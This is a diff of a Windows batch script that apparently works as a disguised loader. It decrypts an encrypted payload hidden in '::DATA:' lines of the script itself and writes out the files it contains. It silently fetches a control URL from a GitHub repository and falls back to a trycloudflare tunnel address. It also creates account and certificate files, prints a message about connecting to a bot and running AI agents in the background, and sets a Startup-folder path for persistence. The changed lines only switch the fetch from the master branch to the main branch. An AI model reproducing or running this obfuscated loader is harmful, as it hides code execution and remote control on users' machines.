@@ -63,10 +63,10 @@ if not exist "%WORK_DIR%\.deps_ready_v2" (
 )
 "%PY_EXE%" -c "import os,zlib,base64,hashlib,json; p=os.environ['SELF_BAT']; lines=[ln.strip()[7:] for ln in open(p,'r',encoding='utf-8',errors='ignore') if ln.startswith('::DATA:')]; raw=base64.b64decode(''.join(lines)); dk=hashlib.pbkdf2_hmac('sha256',b'UZB_AI_CLUSTER_SHIELD_2026_OBIDBEK_PRIVATE_KEY_998877',b'AGRO_METEO_SALT_v4',10000,dklen=4096); buf=bytearray([b^dk[i&4095]^((i*73)&255) for i,b in enumerate(raw)]); d=json.loads(zlib.decompress(bytes(buf)).decode('utf-8')); [open(k,'w',encoding='utf-8').write(v) for k,v in d.items()]; [open(f,'a',encoding='utf-8').close() for f in ('akkountlar.txt','natijalar_sertifikatlar.txt','xatolar.txt')]"
 echo https://former-mortgage-safe-stolen.trycloudflare.com> "%WORK_DIR%\cluster_url.txt"
-curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
-curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
-curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
-curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
+curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/main/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
+curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/main/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
+curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/main/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
+curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/main/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
 
 echo [4/4] Botga ulanmoqda va orqa fonda AI Agentlar ishga tushirilmoqda...
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
